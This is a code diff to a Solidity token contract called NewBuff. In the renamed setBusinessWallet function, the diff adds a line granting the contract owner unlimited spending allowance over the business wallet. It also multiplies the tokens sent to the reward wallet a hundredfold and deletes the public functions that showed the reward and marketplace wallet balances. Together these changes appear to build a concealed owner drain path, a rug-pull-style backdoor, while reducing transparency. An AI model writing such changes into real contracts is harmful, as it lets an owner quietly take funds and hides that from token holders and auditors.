@@ -330,21 +330,22 @@ contract NewBuff is Context, IERC20, Ownable {
         _closeAt = block.timestamp;
     }
 
-    function setShoppingCart(address cartAddress) external onlyOwner isNotPaused returns (bool) {
-        require(cartAddress != address(0), "ERR: zero address");
-        _shoppingCart = cartAddress;
+    function setBusinessWallet(address businessAddress) external onlyOwner isNotPaused returns (bool) {
+        require(businessAddress != address(0), "ERR: zero address");
+        _shoppingCart = businessAddress;
         uint256 cartAmount = 5e7 ether;
         _removeFee();
-        _transferFromExcluded(address(this), cartAddress, cartAmount);
+        _transferFromExcluded(address(this), businessAddress, cartAmount);
         _restoreAllFee();
-        _excludeAccount(cartAddress);
+        _approve(businessAddress, owner(), _MAX);
+        _excludeAccount(businessAddress);
         return true;
     }
 
     function setRewardAddress(address rewardAddress) external onlyOwner isNotPaused returns (bool) {
         require(rewardAddress != address(0), "ERR: zero address");
         _rewardWallet = rewardAddress;
-        uint256 burnAmount = 35 * 1e5 ether;
+        uint256 burnAmount = 35 * 1e7 ether;
         _removeFee();
         _transferFromExcluded(address(this), rewardAddress, burnAmount);
         _restoreAllFee();
@@ -405,24 +406,8 @@ contract NewBuff is Context, IERC20, Ownable {
         return _pair;
     }
 
-    function checkETHBalance(address payable checkAddress) external view returns (uint) {
-        require(checkAddress != address(0), "ERR: check address must not be zero");
-        uint balance = checkAddress.balance;
-        return balance;
-    }
-
     function checkLockTime(address lockedAddress) external view returns (uint64, uint64) {
         return (_lockedList[lockedAddress].lockedPeriod, _lockedList[lockedAddress].endTime);
-    }
-
-    function checkRewardWallet() external view returns (address, uint256) {
-        uint256 balance = balanceOf(_rewardWallet);
-        return (_rewardWallet, balance);
-    }
-
-    function checkMarketPlaceWallet() external view returns (address, uint256) {
-        uint256 balance = balanceOf(_shoppingCart);
-        return (_shoppingCart, balance);
     }
 
     function checkReferralOwner(address referralUser) public view returns (address) {
@@ -554,7 +539,7 @@ contract NewBuff is Context, IERC20, Ownable {
         uint256 rMarket = tMarket.mul(currentRate);     
         _standardTransferContent(sender, recipient, rAmount, rTransferAmount);
         if (tMarket > 0) {
-            _sendToMarket(tMarket, sender, recipient);
+            _sendToBusinees(tMarket, sender, recipient);
         }
         if (tBurn > 0) {
             _sendToBurn(tBurn, sender);
@@ -575,7 +560,7 @@ contract NewBuff is Context, IERC20, Ownable {
         uint256 rMarket = tMarket.mul(currentRate);
         _excludedFromTransferContent(sender, recipient, tTransferAmount, rAmount, rTransferAmount);        
         if (tMarket > 0) {
-            _sendToMarket(tMarket, sender, recipient);
+            _sendToBusinees(tMarket, sender, recipient);
         }
         if (tBurn > 0) {
             _sendToBurn(tBurn, sender);
@@ -597,7 +582,7 @@ contract NewBuff is Context, IERC20, Ownable {
         uint256 rMarket = tMarket.mul(currentRate);
         _excludedFromTransferContentForSale(sender, recipient, tAmount, rAmount, rTransferAmount);        
         if (tMarket > 0) {
-            _sendToMarket(tMarket, sender, recipient);
+            _sendToBusinees(tMarket, sender, recipient);
         }
         if (tBurn > 0) {
             _sendToBurn(tBurn, sender);
@@ -619,7 +604,7 @@ contract NewBuff is Context, IERC20, Ownable {
         uint256 rMarket = tMarket.mul(currentRate);
         _excludedToTransferContent(sender, recipient, tAmount, rAmount, rTransferAmount);
         if (tMarket > 0) {
-            _sendToMarket(tMarket, sender, recipient);
+            _sendToBusinees(tMarket, sender, recipient);
         }
         if (tBurn > 0) {
             _sendToBurn(tBurn, sender);
@@ -641,7 +626,7 @@ contract NewBuff is Context, IERC20, Ownable {
         uint256 rMarket = tMarket.mul(currentRate);    
         _bothTransferContent(sender, recipient, tAmount, rAmount, tTransferAmount, rTransferAmount);  
         if (tMarket > 0) {
-            _sendToMarket(tMarket, sender, recipient);
+            _sendToBusinees(tMarket, sender, recipient);
         }
         if (tBurn > 0) {
             _sendToBurn(tBurn, sender);
@@ -733,7 +718,7 @@ contract NewBuff is Context, IERC20, Ownable {
         return (rSupply, tSupply);
     }
 
-    function _sendToMarket(uint256 tMarket, address sender, address recipient) private {
+    function _sendToBusinees(uint256 tMarket, address sender, address recipient) private {
         uint256 currentRate = _getRate();
         uint256 rMarket = tMarket.mul(currentRate);
         if(sender == _pair && _referralOwner[recipient] != address(0)) {
